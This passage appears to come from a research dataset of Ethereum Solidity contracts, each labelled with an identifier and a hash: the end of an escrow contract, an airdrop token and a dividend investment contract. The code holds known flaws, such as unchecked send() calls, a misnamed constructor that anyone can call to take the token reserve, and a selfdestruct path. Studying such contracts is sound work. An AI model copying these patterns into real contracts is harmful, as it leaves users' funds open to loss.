            emit HasToPayFee(_transactionID, Party.Sender);
        } else { 
            raiseDispute(_transactionID, arbitrationCost);
        }
    }
    function raiseDispute(uint _transactionID, uint _arbitrationCost) internal {
        Transaction storage transaction = transactions[_transactionID];
        transaction.status = Status.DisputeCreated;
        transaction.disputeId = arbitrator.createDispute.value(_arbitrationCost)(AMOUNT_OF_CHOICES, arbitratorExtraData);
        disputeIDtoTransactionID[transaction.disputeId] = _transactionID;
        emit Dispute(arbitrator, transaction.disputeId, _transactionID, _transactionID);
        if (transaction.senderFee > _arbitrationCost) {
            uint extraFeeSender = transaction.senderFee - _arbitrationCost;
            transaction.senderFee = _arbitrationCost;
            transaction.sender.send(extraFeeSender);
        }
        if (transaction.receiverFee > _arbitrationCost) {
            uint extraFeeReceiver = transaction.receiverFee - _arbitrationCost;
            transaction.receiverFee = _arbitrationCost;
            transaction.receiver.send(extraFeeReceiver);
        }
    }
    function submitEvidence(uint _transactionID, string _evidence) public {
        Transaction storage transaction = transactions[_transactionID];
        require(
            msg.sender == transaction.sender || msg.sender == transaction.receiver,
            "The caller must be the sender or the receiver."
        );
        require(
            transaction.status < Status.Resolved,
            "Must not send evidence if the dispute is resolved."
        );
        emit Evidence(arbitrator, _transactionID, msg.sender, _evidence);
    }
    function appeal(uint _transactionID) public payable {
        Transaction storage transaction = transactions[_transactionID];
        arbitrator.appeal.value(msg.value)(transaction.disputeId, arbitratorExtraData);
    }
    function rule(uint _disputeID, uint _ruling) public {
        uint transactionID = disputeIDtoTransactionID[_disputeID];
        Transaction storage transaction = transactions[transactionID];
        require(msg.sender == address(arbitrator), "The caller must be the arbitrator.");
        require(transaction.status == Status.DisputeCreated, "The dispute has already been resolved.");
        emit Ruling(Arbitrator(msg.sender), _disputeID, _ruling);
        executeRuling(transactionID, _ruling);
    }
    function executeRuling(uint _transactionID, uint _ruling) internal {
        Transaction storage transaction = transactions[_transactionID];
        require(_ruling <= AMOUNT_OF_CHOICES, "Invalid ruling.");
        if (_ruling == SENDER_WINS) {
            transaction.sender.send(transaction.senderFee + transaction.amount);
        } else if (_ruling == RECEIVER_WINS) {
            transaction.receiver.send(transaction.receiverFee + transaction.amount);
        } else {
            uint split_amount = (transaction.senderFee + transaction.amount) / 2;
            transaction.sender.send(split_amount);
            transaction.receiver.send(split_amount);
        }
        transaction.amount = 0;
        transaction.senderFee = 0;
        transaction.receiverFee = 0;
        transaction.status = Status.Resolved;
    }
    function getCountTransactions() public view returns (uint countTransactions) {
        return transactions.length;
    }
    function getTransactionIDsByAddress(address _address) public view returns (uint[] transactionIDs) {
        uint count = 0;
        for (uint i = 0; i < transactions.length; i++) {
            if (transactions[i].sender == _address || transactions[i].receiver == _address)
                count++;
        }
        transactionIDs = new uint[](count);
        count = 0;
        for (uint j = 0; j < transactions.length; j++) {
            if (transactions[j].sender == _address || transactions[j].receiver == _address)
                transactionIDs[count++] = j;
        }
    }
}
```

## RQ1_76fc25a4f6a8

SHA-256 `10ada290c23f7e16d4004ece62ac006a624fbe65c93f1b55939c3e9915ec0bc6`

```solidity
pragma solidity ^0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract NewIntelTechMedia is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "NewIntelTechMedia";
    string public constant symbol = "NETM";
    uint public constant decimals = 18;
    uint256 public totalSupply = 500000000e18;
    uint256 public totalDistributed = 250000000e18;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value = 2500e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function NETM() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_63bf9791ac38

SHA-256 `c08a14189bb7d1b6273242e33196575df4d38422d6ac815cf71470fb9247b04d`

```solidity
pragma solidity ^0.4.18;
contract Dividend {
    struct Record {
        uint balance;
        uint shares;
        uint index;
    }
    mapping (address => Record) public records;
    address[] public investors;
    address public funder;
    uint public startTime;
    uint public totalShares;
    uint public lastInvestmentTime;
    event Invested(uint indexed timestamp, address indexed from, uint amount, uint shares);
    event Withdrawn(uint indexed timestamp, address indexed from, uint amount);
    function Dividend() public payable {
        records[msg.sender] = Record(msg.value,
            totalShares = allocateShares(msg.value, 0),
            investors.push(funder = msg.sender));
        Invested(startTime = lastInvestmentTime = now, msg.sender, msg.value, totalShares);
    }
    function () public payable {
        if (msg.value > 0) {
            invest();
        } else {
            withdraw();
        }
    }
    function investorCount() public view returns (uint) {
      return investors.length;
    }
    function invest() public payable returns (uint) {
        uint value = msg.value;
        uint shares = allocateShares(value, (now - startTime) / 1 hours);
        if (shares > 0) {
            for (uint i = investors.length; i > 0; i--) {
                Record storage rec = records[investors[i - 1]];
                rec.balance += value * rec.shares / totalShares;
            }
            address investor = msg.sender;
            rec = records[investor];
            if (rec.index > 0) {
                rec.shares += shares;
            } else {
                rec.shares = shares;
                rec.index = investors.push(investor);
            }
            totalShares += shares;
            Invested(lastInvestmentTime = now, investor, value, shares);
        }
        return shares;
    }
    function withdraw() public returns (uint) {
        Record storage rec = records[msg.sender];
        uint balance = rec.balance;
        if (balance > 0) {
            rec.balance = 0;
            msg.sender.transfer(balance);
            Withdrawn(now, msg.sender, balance);
        }
        if (now - lastInvestmentTime > 4 weeks) {
            selfdestruct(funder);
        }
        return balance;
    }
    function allocateShares(uint weis, uint bonus) public pure returns (uint) {
        return weis * (1000 + bonus) / 1 ether;
    }
}
```
